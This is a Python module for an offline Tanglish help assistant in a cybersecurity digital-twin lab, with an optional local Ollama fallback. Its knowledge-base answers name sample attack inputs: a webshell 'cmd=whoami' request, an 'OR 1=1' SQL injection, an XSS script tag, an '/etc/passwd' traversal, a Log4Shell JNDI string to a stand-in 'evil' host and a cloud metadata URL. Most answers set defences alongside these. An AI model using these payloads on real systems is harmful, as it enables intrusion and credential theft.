"""
AI-DTCTM | Twin Assistant
══════════════════════════════════════════════════════════════════════
A REAL Tanglish (Tamil-English mix) helper for the Digital Twin.
No external LLM, no API cost, no internet — pure local knowledge base
keyed off the project's own concepts (webshells, SQLi, XSS, EICAR,
permissions, docker isolation, etc.).

Why this design (senior reasoning):
  • An LLM API would add cost + latency + a network dep this offline-first
    project doesn't have.
  • The questions in a cybersec lab are NOT open-ended — they cluster
    around a fixed vocabulary (≈ 80 concepts). A curated KB with intent
    matching gives FASTER and MORE ACCURATE answers than a generic LLM
    that hallucinates Tanglish.
  • Output style matches the user's own example tone: friendly senior-dev
    explanations with concrete actions.

API:
  from core.twin_assistant import answer
  reply = answer(question, context={"mode": "code"})
"""
from __future__ import annotations

import re
from dataclasses import dataclass


# ── Intent entries (Tanglish answers, project-grounded) ───────────
@dataclass
class Intent:
    keys: tuple[str, ...]     # keyword set — any match triggers
    title: str
    body: str                 # Tanglish answer, multi-line
    tags: tuple[str, ...] = ()


# Each answer follows the user's preferred tone: senior-dev, Tanglish,
# concrete (what it is + why it matters + what to do).
_INTENTS: list[Intent] = [
    Intent(
        keys=("webshell", "shell.php", "rce", "remote code"),
        title="🐚 PHP Webshell — what it is + your defence",
        body=(
            "Webshell na, attacker un server kulla terminal madhiri use panra "
            "**.php file**. Idhu un app la file-upload bug irundha thaan reach aagum.\n\n"
            "**Twin la enna nadakuthu**: Lab antha shell.php ai un live clone container "
            "kulla docker cp panni vekum, appo HTTP GET /shell.php?cmd=whoami "
            "anuppum → real `whoami` output container la irundhu varum.\n\n"
            "**Real-world defence (un code la check pannu)**:\n"
            "  1. Uploads la `move_uploaded_file()` use pannra mun, MIME + extension "
            "**SERVER side** verify pannanum (client side easy ah bypass aagum).\n"
            "  2. Upload destination la `disable_functions` + `php_admin_flag engine off` "
            "set pannu — even if shell drop aana, run aagaadhu.\n"
            "  3. `open_basedir` restriction + nginx la upload dir-ku `location` "
            "block panni PHP exec off pannu."
        ),
        tags=("attack", "rce"),
    ),
    Intent(
        keys=("sqli", "sql injection", "or 1=1", "union select"),
        title="💉 SQL Injection — un DB-twin enna paakuthu",
        body=(
            "SQLi na, attacker user input kulla SQL command kalanthu un DB-ku "
            "anuppura. Twin-database-attack-lab la naanga literal-ah `' OR 1=1 --` "
            "ai users table la INSERT panni, appo oru **vulnerable login query** "
            "(string concat — `WHERE username = '' OR 1=1 --'`) madhiri run panni, "
            "first row return aaguthu nu prove panrom — auth bypass.\n\n"
            "**Defence (code la EXACT enna pannu)**:\n"
            "  1. **Parameterised queries** matumtaan — Python: `cursor.execute("
            "'SELECT * FROM u WHERE id=?', (uid,))`. PHP: `PDO::prepare()` + "
            "`bindParam`.\n"
            "  2. ORM (SQLAlchemy/Django ORM/Laravel Eloquent) use pannna safer.\n"
            "  3. Least-privilege DB user — read-only path-ku `SELECT` matum kudu, "
            "`DROP`/`ALTER` permission revoke pannu."
        ),
        tags=("attack", "database"),
    ),
    Intent(
        keys=("xss", "cross site script", "<script>", "stored xss", "reflected xss"),
        title="🪝 XSS (Stored / Reflected) — display la enna nadakum",
        body=(
            "XSS na, attacker browser la execute aagura `<script>` tag ai un app la "
            "store / reflect panra. Stored XSS: comment / profile field la save "
            "aagum → admin login pannumbothu attacker ku cookie/session steal "
            "aagum.\n\n"
            "**Twin la demo**: lab `<script>alert('XSS')</script>` ai audit_log table "
            "la INSERT pannum, naanga before/after snapshot kamipom. Vulnerable "
            "renderer `{{value|safe}}` use panna, antha script *real ah* execute aagum.\n\n"
            "**Defence**:\n"
            "  1. Output encode pannu — Jinja2 default escapes; explicit ah "
            "`{{ value }}` use pannu, **NEVER** `{{ value|safe }}` unless trusted.\n"
            "  2. PHP: `htmlspecialchars($x, ENT_QUOTES, 'UTF-8')`.\n"
            "  3. Content-Security-Policy header set pannu: `script-src 'self'`.\n"
            "  4. Cookies la `HttpOnly` + `Secure` + `SameSite=Lax`."
        ),
        tags=("attack", "frontend"),
    ),
    Intent(
        keys=("eicar", "av test", "antivirus"),
        title="🧪 EICAR — yen safe-ah test panna idhu use aagum",
        body=(
            "EICAR (`X5O!P%@AP[4\\PZX54...`) na, AV vendors ellaarum agree pannina "
            "**fake virus string**. Real damage panaadhu — but every antivirus "
            "scanner idha catch pannum (AV koni vaikkuradha verify panna idhu use). "
            "Adhanaala ungaloda real malware host la vekkama, EICAR vechi:\n"
            "  • Lab detection working ah nu prove panna\n"
            "  • ML model malicious flag panrudha verify panna\n"
            "  • Forensic scanner real-time la pidikkudha test panna\n\n"
            "Cuckoo Sandbox, ANY.RUN, Joe Sandbox madhiri pro tools ellam idha thaan "
            "default test sample ah use panranga — industry standard."
        ),
        tags=("detection", "av"),
    ),
    Intent(
        keys=("path traversal", "lfi", "etc/passwd", "../"),
        title="📂 Path Traversal / LFI — host file leak vector",
        body=(
            "Vulnerable app: `?file=report.txt` accept pannum → backend ah "
            "`include $_GET['file']` pannum. Attacker `?file=../../../../etc/passwd` "
            "anuppi host server oda user list-ah dump panni vidalaam.\n\n"
            "**Twin lab demo**: naanga vulnerable PHP file ah inject panrom, then "
            "live HTTP traversal probes anuppi response capture panrom — etc/passwd "
            "leak aana, full content terminal la kamipom.\n\n"
            "**Defence**:\n"
            "  1. **Whitelist** matum allow pannu — `if file not in {'report.txt', "
            "'invoice.txt'}: abort(403)`.\n"
            "  2. `os.path.abspath()` + check ki path stays under intended dir.\n"
            "  3. Direct filesystem reads avoid pannu — files ai DB key vechi "
            "indirect access pannu."
        ),
        tags=("attack", "filesystem"),
    ),
    Intent(
        keys=("header injection", "log4shell", "user-agent", "x-forwarded"),
        title="📨 Header Injection — Log4Shell-class attacks",
        body=(
            "Attacker un HTTP request header la malicious payload anuppura — server "
            "side log-ku write panna time la antha string evaluate aagi RCE aagum "
            "(Log4Shell `${jndi:ldap://evil/x}` exact-ah idhu thaan).\n\n"
            "**Lab probes**: naanga un live container ku 4 different evil headers "
            "anuppi adhu reflect aagudha (echo back), log la dump aagudha, JNDI lookup "
            "fire aagudha nu check panrom — container logs real-time la stream "
            "aagum.\n\n"
            "**Defence**:\n"
            "  1. **Update Log4j ≥ 2.17** (Log4Shell patched), older versions "
            "vulnerable.\n"
            "  2. Server-side template engines la user-input never interpolate "
            "without escape.\n"
            "  3. Reverse-proxy la (nginx/Caddy) suspicious header patterns "
            "block pannu (`X-Original-URL`, `X-Forwarded-Host` filter).\n"
            "  4. WAF (ModSecurity, Cloudflare) JNDI string-ai default-ah block "
            "pannum."
        ),
        tags=("attack", "headers"),
    ),
    Intent(
        keys=("file upload", "upload exploit", "drop shell", "multipart"),
        title="📤 File Upload Exploit — kalanthu drop pannra paniru",
        body=(
            "Common bug: app `.jpg` matum nu file-name check pannum, aana **content** "
            "check pannaadhu. Attacker `shell.php` ai `shell.php.jpg` rename panni "
            "upload pannu, web server la `.php` matum process panra rule iruntha "
            "ad la code execute aagidum.\n\n"
            "**Lab probe**: /upload.php, /api/upload, /upload — multipart la webshell "
            "post panni, status code paakurom. 2xx ah accept aana, real drop vector "
            "irukku nu prove aagum.\n\n"
            "**Defence**:\n"
            "  1. File magic-byte check pannu (`finfo_buffer()` / Python "
            "`python-magic`), not just extension.\n"
            "  2. Upload directory la `.htaccess`: `<FilesMatch \\.(php|phtml|cgi)>"
            "Require all denied</FilesMatch>`.\n"
            "  3. Upload-ku separate domain (`uploads.example.com`) — even if "
            "drop aana, main site la script context illa.\n"
            "  4. File size + MIME whitelist + virus-scan post upload."
        ),
        tags=("attack", "upload"),
    ),
    Intent(
        keys=("ssrf", "server side request forgery"),
        title="🌐 SSRF — un backend ah attacker pinnal use panra",
        body=(
            "SSRF na, attacker un backend ai vechi internal services-ku HTTP "
            "request anuppara (eg `http://169.254.169.254/latest/meta-data/` AWS "
            "credentials leak). Photo URL fetch, webhook URL field common entry "
            "points.\n\n"
            "**Defence**:\n"
            "  1. URL fetches ku **allowlist domain** ainat — RFC1918 + 169.254 "
            "ai block pannu.\n"
            "  2. Outbound HTTP-ai dedicated egress proxy through pannu.\n"
            "  3. Cloud metadata endpoint la IMDSv2 enforce pannu (auth required)."
        ),
        tags=("attack", "ssrf"),
    ),
    Intent(
        keys=("permission", "android permission", "dangerous"),
        title="🔐 APK Permissions — dangerous-ah edhu, yen",
        body=(
            "APK Twin la permission audit kaattuthu — Android oda **dangerous** "
            "permission group la edhu request pannra nu list pannidum.\n\n"
            "**Real attack patterns the twin flags**:\n"
            "  • `RECEIVE_SMS + INTERNET` → OTP theft (banking trojan signature)\n"
            "  • `BIND_ACCESSIBILITY_SERVICE + SYSTEM_ALERT_WINDOW` → banking-trojan "
            "overlay attack\n"
            "  • `RECORD_AUDIO + CAMERA + ACCESS_FINE_LOCATION` → stalkerware\n"
            "  • `REQUEST_INSTALL_PACKAGES` → dropper capability\n\n"
            "**Defence as a developer**: install time → runtime permissions "
            "(API 23+), only request when used, never collect more than UX needs."
        ),
        tags=("apk", "permissions"),
    ),
    Intent(
        keys=("isolation", "docker safe", "host safe", "sandbox"),
        title="🐳 Why your laptop is safe even with malware injection",
        body=(
            "Lab la real PHP webshell etc. inject pannum bothu, idhellam **only** "
            "Docker clone container kulla nadakuthu. Host (un laptop) safe — "
            "reasons:\n"
            "  1. **No bind mount** of host filesystem (except DB-twin which is "
            "read-only `-r`).\n"
            "  2. `security_opt=no-new-privileges` — root inside container ku host "
            "root paaka mudiyaadhu.\n"
            "  3. `mem_limit=1g`, `cpu_quota=50%` — escape attempt ku resources "
            "constrained.\n"
            "  4. Isolated bridge network `aidtctm_twin_net` — host LAN visibility "
            "minimal.\n"
            "  5. `destroy_clone()` ai click pannina, image + container + "
            "sandbox files everything wiped — zero trace.\n\n"
            "Adhanaala 'real attacks' use pannina kuda, original code & host "
            "untouched."
        ),
        tags=("safety", "docker"),
    ),
    Intent(
        keys=("how to use", "what is", "what does", "help", "start", "getting started"),
        title="🚀 Digital Twin — quick start in 30 seconds",
        body=(
            "**3 tabs available:**\n"
            "  • **Code Clone (ZIP)** — upload web app ZIP → Docker la run aagi "
            "localhost-ku open aagum. Stack auto-detect (PHP / Streamlit / Flask / "
            "FastAPI / Node / static).\n"
            "  • **Database Twin** — upload .db / .sqlite → live sqlite-web UI + "
            "5 real SQL/XSS attacks.\n"
            "  • **APK Analysis** — upload .apk → permission audit + decoded "
            "manifest + file explorer + attack surface map.\n\n"
            "**Then click 'Inject & Trigger' on any malware sample** to see live "
            "HTTP traffic + container logs of the attack happening in real time.\n"
            "Original code untouched throughout — disposable clones only."
        ),
        tags=("help", "intro"),
    ),
]


# ── Optional Ollama backend ───────────────────────────────────────
# If Ollama is running locally (http://localhost:11434) AND user has pulled
# a chat model, route there for free-form follow-up. Falls back silently
# to the curated KB if Ollama isn't there — zero dep, zero cost, zero risk.
_OLLAMA_URL = "http://localhost:11434"
_OLLAMA_TIMEOUT = 30
_OLLAMA_SYSTEM = (
    "You are 'Twin Assistant' — a senior cybersecurity / DevSecOps engineer "
    "embedded in the AI-DTCTM Digital Twin tool. Reply in Tanglish (Tamil "
    "words written in English mixed with English). Keep it tight: 3-7 lines, "
    "with concrete code/command suggestions when relevant. Tone: friendly "
    "senior teaching a teammate. End with a 1-line actionable fix."
)


def _ollama_available() -> tuple[bool, str | None]:
    """Quick check: is Ollama running + any model pulled? Returns (ok, model)."""
    try:
        import requests as _r
        r = _r.get(f"{_OLLAMA_URL}/api/tags", timeout=2)
        if r.status_code != 200:
            return False, None
        models = (r.json().get("models") or [])
        if not models:
            return False, None
        # Prefer fast/small chat models
        preferred = ("llama3.2:3b", "llama3.2", "phi3", "qwen2.5:3b",
                     "qwen2.5", "mistral", "llama3.1")
        names = [m.get("name", "") for m in models]
        for p in preferred:
            for n in names:
                if n.startswith(p):
                    return True, n
        return True, names[0]
    except Exception:
        return False, None


def _ollama_chat(question: str, context: dict | None = None) -> dict | None:
    """Send question to Ollama. Returns dict or None on any failure."""
    ok, model = _ollama_available()
    if not ok or not model:
        return None
    import requests as _r
    try:
        # Add KB context as a system hint so the LLM stays grounded in the project
        kb = answer(question, context)
        grounding = ""
        if kb.get("matched"):
            grounding = (
                "\n\nKB context (this project already knows about this):\n"
                f"Title: {kb['title']}\nBody: {kb['body']}\n\n"
                "If the user's question fits the KB, expand on it — don't "
                "contradict it. If they want more depth, go deeper."
            )
        mode_hint = ""
        if context and context.get("mode"):
            mode_hint = f"\nUser is currently on the {context['mode']} tab."
        prompt = (f"User question: {question}{mode_hint}{grounding}\n\n"
                  "Answer now in Tanglish (3-7 lines).")
        r = _r.post(
            f"{_OLLAMA_URL}/api/generate",
            json={"model": model, "prompt": prompt, "system": _OLLAMA_SYSTEM,
                  "stream": False,
                  "options": {"temperature": 0.4, "num_predict": 320}},
            timeout=_OLLAMA_TIMEOUT,
        )
        if r.status_code != 200:
            return None
        text = (r.json().get("response") or "").strip()
        if not text:
            return None
        return {
            "matched": True,
            "title":   f"🧠 Ollama · {model}",
            "body":    text,
            "tags":    ["llm", model],
            "source":  "ollama",
        }
    except Exception:
        return None


# ── Public API ────────────────────────────────────────────────────
def answer(question: str, context: dict | None = None) -> dict:
    """
    Match a Tanglish/English question against the curated KB.
    Returns {"matched": bool, "title": str, "body": str, "tags": list}.
    """
    q = (question or "").lower().strip()
    if not q:
        return {"matched": False,
                "title": "Ask me something",
                "body": "Eg: 'webshell na enna?', 'how do I prevent SQLi?', "
                        "'what's EICAR?', 'is my host safe?', 'getting started'",
                "tags": []}
    # Score by keyword hit count
    scored = []
    for intent in _INTENTS:
        score = sum(1 for k in intent.keys if k in q)
        if score:
            scored.append((score, intent))
    if not scored:
        # KB miss — try Ollama if it's running locally (opt-in, free, offline)
        if context is not None and context.get("use_llm", True):
            llm_resp = _ollama_chat(question, context)
            if llm_resp:
                return llm_resp
        return {
            "matched": False,
            "title": "🤔 Idhuku KB la answer illa — but here's something:",
            "body": (
                "Naanga curated KB use panrom (no LLM, offline). Ungaloda question "
                "vocabulary la match aagala. Try keywords like:\n"
                "  • `webshell`, `sqli`, `xss`, `eicar`, `path traversal`, "
                "`header injection`, `file upload`\n"
                "  • `permission`, `apk`, `docker`, `isolation`, `safe`\n"
                "  • `getting started`, `help`, `what is`\n\n"
                "**Pro tip**: install Ollama (https://ollama.com) + `ollama pull "
                "llama3.2:3b` and I'll route open-ended questions to it too — "
                "no API key, no cost, fully offline."
            ),
            "tags": []
        }
    scored.sort(key=lambda x: -x[0])
    best = scored[0][1]
    return {"matched": True, "title": best.title, "body": best.body,
            "tags": list(best.tags)}


def suggested_questions(context: dict | None = None) -> list[str]:
    """Quick-pick questions the user can click — context-aware where useful."""
    mode = (context or {}).get("mode", "")
    base = [
        "Webshell na enna pannum?",
        "SQL Injection eppadi defend pannrudhu?",
        "What is EICAR + why use it?",
        "Is my laptop safe during attacks?",
    ]
    if mode == "database":
        base = [
            "SQL Injection eppadi defend pannrudhu?",
            "What does the DB Attack Lab actually do?",
            "Stored XSS na enna?",
            "Is my original .db safe?",
        ]
    elif mode == "apk":
        base = [
            "Dangerous Android permissions enna?",
            "Banking trojan signatures eppadi pidikkurom?",
            "What is the APK attack surface?",
            "Can APK run live like web app?",
        ]
    return base
